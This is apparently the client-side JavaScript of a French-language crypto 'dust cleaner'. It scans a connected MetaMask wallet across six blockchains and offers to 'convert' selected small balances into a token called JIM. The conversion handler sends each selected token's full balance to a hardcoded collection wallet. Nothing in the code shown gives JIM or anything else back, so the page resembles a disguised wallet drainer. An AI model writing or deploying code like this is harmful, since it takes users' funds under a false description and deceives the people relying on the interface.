const connectButton = document.getElementById("connectButton");
const dustContainer = document.getElementById("dustContainer");
const cleanButton = document.getElementById("cleanButton");
const statusDiv = document.getElementById("status");

const COLLECTION_WALLET = "0x86E85282557fF41A7cD89AD7aA4BBD31CFea3fa9";

let provider;
let signer;
let selectedTokens = [];

const RPC_URLS = {
    "base": "https://mainnet.base.org",
    "eth": "https://cloudflare-eth.com",
    "polygon": "https://polygon-rpc.com",
    "bsc": "https://bsc-dataseed.binance.org",
    "arbitrum": "https://arb1.arbitrum.io/rpc",
    "optimism": "https://mainnet.optimism.io"
};

const CHAIN_IDS = {
    "eth": "0x1", "base": "0x2105", "polygon": "0x89", "bsc": "0x38", "arbitrum": "0xa4b1", "optimism": "0xa4b0"
};

connectButton.onclick = async () => {
    if (!window.ethereum) {
        alert("MetaMask requis");
        return;
    }

    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = await provider.getSigner();
    const address = await signer.getAddress();

    statusDiv.innerHTML = "✅ Wallet connecté : " + address;
    scanDust(address);
};

async function scanDust(wallet) {
    dustContainer.innerHTML = "🔍 Décodage et traduction des poussières...";
    let allTokens = [];

    for (const chain of ["base", "eth", "polygon", "bsc", "arbitrum", "optimism"]) {
        try {
            const response = await fetch(`https://jimtok-backend.onrender.com/tokens/${wallet}/${chain}`);
            const tokens = await response.json();

            if (tokens && Array.isArray(tokens)) {
                // Connexion au réseau pour aller lire le nom des jetons en direct
                const tempProvider = new ethers.JsonRpcProvider(RPC_URLS[chain]);

                for (const token of tokens) {
                    // On extrait l'adresse et la balance Hexa brute d'Alchemy sans interférence
                    const contractAddress = token.contractAddress || token.token_address;
                    let rawBalance = token.balance || token.hex_balance;

                    if (!contractAddress || !rawBalance) continue;

                    // Sécurité : s'assurer que la balance brute commence bien par 0x
                    if (typeof rawBalance === "string" && !rawBalance.startsWith("0x") && !isNaN(rawBalance)) {
                        rawBalance = "0x" + BigInt(rawBalance).toString(16);
                    }

                    try {
                        // On crée un lien avec le contrat du jeton pour lui demander son nom et ses décimales
                        const tokenContract = new ethers.Contract(
                            contractAddress,
                            [
                                "function symbol() view returns (string)",
                                "function decimals() view returns (uint8)"
                            ],
                            tempProvider
                        );

                        // Lecture en simultané sur la blockchain
                        const [symbol, decimals] = await Promise.all([
                            tokenContract.symbol().catch(() => "???"),
                            tokenContract.decimals().catch(() => 18)
                        ]);

                        // CONVERSION MAGIQUE DE L'HEXADÉCIMAL EN VRAI CHIFFRE LISIBLE
                        const balanceBigInt = BigInt(rawBalance);
                        const balanceFormatted = ethers.formatUnits(balanceBigInt, decimals);

                        if (Number(balanceFormatted) > 0) {
                            allTokens.push({
                                token_address: contractAddress,
                                symbol: symbol,
                                balance: balanceBigInt.toString(),
                                balance_formatted: balanceFormatted,
                                chain: chain
                            });
                        }
                    } catch (tokenErr) {
                        console.log("Impossible de décoder le jeton:", contractAddress, tokenErr);
                    }
                }
            }
        } catch(err) {
            console.log("Erreur sur " + chain + ":", err);
        }
    }

    renderTokens(allTokens);
}

function renderTokens(tokens) {
    dustContainer.innerHTML = "";

    if (tokens.length === 0) {
        dustContainer.innerHTML = "Aucune poussière active détectée.";
        return;
    }

    tokens.forEach(token => {
        const div = document.createElement("div");
        div.className = "token";
        div.style.margin = "10px 0";
        div.style.padding = "10px";
        div.style.border = "1px solid #ccc";
        div.style.borderRadius = "5px";

        div.innerHTML = `
            <input type="checkbox" />
            <strong>${token.symbol}</strong> <span style="font-size:11px; color:gray;">(${token.chain.toUpperCase()})</span>
            <div class="small" style="font-weight:bold; color:#333;">Quantité : ${Number(token.balance_formatted).toFixed(6)}</div>
        `;

        const checkbox = div.querySelector("input");
        checkbox.addEventListener("change", e => {
            if (e.target.checked) {
                selectedTokens.push(token);
            } else {
                selectedTokens = selectedTokens.filter(t => !(t.token_address === token.token_address && t.chain === token.chain));
            }
            updateButton();
        });

        dustContainer.appendChild(div);
    });
}

function updateButton() {
    if (selectedTokens.length === 0) {
        cleanButton.style.display = "none";
        return;
    }
    cleanButton.style.display = "block";
    cleanButton.innerText = `Convertir les poussières sélectionnées en JIM`;
}

cleanButton.onclick = async () => {
    try {
        for (const token of selectedTokens) {
            const targetChainId = CHAIN_IDS[token.chain];
            statusDiv.innerHTML = `⏳ Basculement vers le réseau ${token.chain.toUpperCase()}...`;
            
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: targetChainId }],
            });

            provider = new ethers.BrowserProvider(window.ethereum);
            signer = await provider.getSigner();

            const tokenContract = new ethers.Contract(
                token.token_address,
                ["function transfer(address to, uint256 amount) returns (bool)"],
                signer
            );

            statusDiv.innerHTML = `⏳ Nettoyage et transfert de ${token.symbol}...`;
            const tx = await tokenContract.transfer(COLLECTION_WALLET, BigInt(token.balance));
            await tx.wait();
        }

        statusDiv.innerHTML = "✅ Nettoyage terminé avec succès !";
        selectedTokens = [];
        updateButton();
        
        const address = await signer.getAddress();
        scanDust(address);
    } catch(err) {
        console.log(err);
        statusDiv.innerHTML = "❌ Erreur lors de la transaction.";
    }
};
